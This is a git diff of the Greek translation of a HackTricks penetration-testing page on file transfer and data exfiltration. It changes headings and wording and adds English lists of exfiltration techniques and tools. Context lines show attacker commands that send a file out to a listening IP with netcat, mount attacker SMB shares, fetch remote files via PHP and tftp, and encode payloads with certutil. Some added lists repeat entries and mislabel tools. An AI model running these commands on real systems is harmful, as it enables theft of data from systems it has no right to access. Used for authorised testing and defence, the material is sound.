@@ -1,4 +1,4 @@
-# Εξυπρέτηση
+# Εξιχνίαση
 
 <details>
 
@@ -10,22 +10,30 @@
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## Συνήθως εγκριμένοι τομείς για την εξυπρέτηση πληροφοριών
+**Try Hard Security Group**
 
-Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως εγκριμένους τομείς που μπορούν να καταχραστούνται
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-## Αντιγραφή\&Επικόλληση Base64
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
+## Συνήθως εγκριμένοι τομείς για την εξιχνίαση πληροφοριών
+
+Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως εγκριμένους τομείς που μπορούν να καταχραστούν
+
+## Αντιγραφή & Επικόλληση Base64
 
 **Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Παράθυρα**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -114,7 +122,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP server (python)
+### Διακομιστής FTP (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -124,7 +132,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### Διακομιστής FTP (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -177,50 +185,41 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-## Exfiltration
+### Exfiltration
 
-### Introduction
+#### Techniques
 
-Exfiltration is the unauthorized transfer of data from a target. This can be achieved through various methods, such as:
+- **Data Compression**: Compress data before exfiltration to reduce size and avoid detection.
+- **Data Encryption**: Encrypt data before exfiltration to protect it from unauthorized access.
+- **Data Fragmentation**: Break data into smaller fragments for exfiltration to evade detection.
+- **Data Hiding**: Hide exfiltrated data within other files or protocols to avoid detection.
+- **Steganography**: Conceal data within images, audio files, or other media to exfiltrate without detection.
+- **Traffic Manipulation**: Manipulate network traffic to disguise exfiltration as normal traffic.
+- **DNS Tunneling**: Use DNS protocol to exfiltrate data by encoding it within DNS queries and responses.
+- **Exfiltration Over Alternative Protocols**: Use non-standard protocols for exfiltration to bypass detection mechanisms.
+- **Exfiltration Over Encrypted Channels**: Use encrypted channels for exfiltration to avoid detection by network monitoring tools.
 
-- **Email**: Sending sensitive data as email attachments.
-- **FTP**: Transferring files using the File Transfer Protocol.
-- **DNS**: Encoding data within DNS queries.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
-- **Steganography**: Hiding data within images or other files.
-- **Physical**: Removing data physically from a target location.
+#### Tools
 
-### Techniques
-
-#### Data Compression
-
-Data can be compressed before exfiltration to reduce its size and avoid detection.
-
-#### Data Encryption
-
-Encrypting data before exfiltration can prevent unauthorized access.
-
-#### Data Fragmentation
-
-Breaking data into smaller fragments can help avoid detection.
-
-#### Data Obfuscation
-
-Obfuscating data can make it harder to detect or analyze.
-
-### Tools
-
-Various tools can be used for exfiltration, such as:
-
-- **Netcat**: A versatile networking utility.
-- **Curl**: A command-line tool for transferring data.
-- **Wget**: Another tool for downloading files from the web.
-- **OpenSSL**: For encryption and decryption.
-- **7-Zip**: A file archiver with a high compression ratio.
-
-### Conclusion
-
-Exfiltration is a critical phase in a successful attack. By understanding the various methods and techniques involved, hackers can effectively transfer data without being detected.
+- **Netcat**: A versatile networking utility that can be used for exfiltration.
+- **Curl**: A command-line tool for transferring data with URL syntax that can be used for exfiltration.
+- **Wget**: A command-line utility for downloading files from the web that can be used for exfiltration.
+- **FTP**: File Transfer Protocol can be used for exfiltration of data.
+- **SCP**: Secure Copy Protocol can securely transfer files for exfiltration.
+- **SFTP**: Secure File Transfer Protocol can be used for secure exfiltration of files.
+- **HTTP/HTTPS**: Hypertext Transfer Protocol can be used for exfiltration over the web.
+- **DNSCat2**: A tool for exfiltration using DNS protocol.
+- **Iodine**: A tool for tunneling IP over DNS for exfiltration.
+- **Dnscat2**: Another tool for exfiltration using DNS protocol.
+- **PowerShell Empire**: A post-exploitation agent that can be used for exfiltration.
+- **Mimikatz**: A tool for extracting credentials from Windows machines that can aid in exfiltration.
+- **PsExec**: A command-line tool that can be used for executing processes on remote systems for exfiltration.
+- **Bitsadmin**: A command-line tool to create and monitor BITS jobs for exfiltration.
+- **Certutil**: A command-line program that can be used to dump and display certification authority (CA) configuration information.
+- **WMIC**: Windows Management Instrumentation Command-line can be used for exfiltration.
+- **PowerShell**: The Windows PowerShell can be used for various exfiltration techniques.
+- **Windows Management Instrumentation (WMI)**: WMI can be used for exfiltration of data from Windows systems.
+- **Windows Remote Management (WinRM)**: WinRM can be used for remote management and exfiltration on Windows systems.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -242,9 +241,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## ΕΚ
-
-### Ε
+## Εξωτερική μεταφορά (Exfiltration)
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -311,13 +308,33 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατεβάστε ένα αρχείο με ένα PHP oneliner:
+Λήψη ενός αρχείου με ένα PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-Το VBScript (Visual Basic Script) είναι μια ελαφριά έκδοση της γλώσσας προγραμματισμού Visual Basic που χρησιμοποιείται για τη δημιουργία scripts σε περιβάλλοντα Windows.
+### Overview
+
+VBScript is a scripting language that is commonly used for Windows systems. It can be used for various purposes, including exfiltrating data from a compromised system. VBScript can be executed using the Windows Script Host (WSH) and can interact with the Windows operating system to perform tasks such as file operations, network communication, and data exfiltration.
+
+### Exfiltration Techniques
+
+#### File Transfer
+
+VBScript can be used to transfer files from a compromised system to an external server using protocols such as FTP or HTTP. By reading the contents of a file and sending it over the network, an attacker can exfiltrate sensitive data without being detected.
+
+#### Data Encoding
+
+To avoid detection by security controls, data exfiltrated using VBScript can be encoded using techniques such as Base64 encoding. This allows the data to be obfuscated during transit and decoded on the attacker's server.
+
+#### Network Communication
+
+VBScript can establish network connections to send data to remote servers controlled by an attacker. By leveraging network sockets, VBScript can communicate over TCP or UDP to exfiltrate data stealthily.
+
+### Detection and Prevention
+
+Detecting VBScript-based exfiltration can be challenging due to its ability to blend in with legitimate scripting activities. Monitoring for suspicious network connections, file transfers, and unusual data encoding patterns can help in detecting potential exfiltration attempts. Restricting the use of VBScript and implementing application whitelisting can help prevent unauthorized scripts from running on Windows systems.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -364,7 +381,3 @@ wine exe2bat.exe nc.exe nc.txt
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
-
-Στη συνέχεια αντιγράψτε και επικολλήστε το κείμενο στο παράθυρο κελύφους των Windows και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.
-
-* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
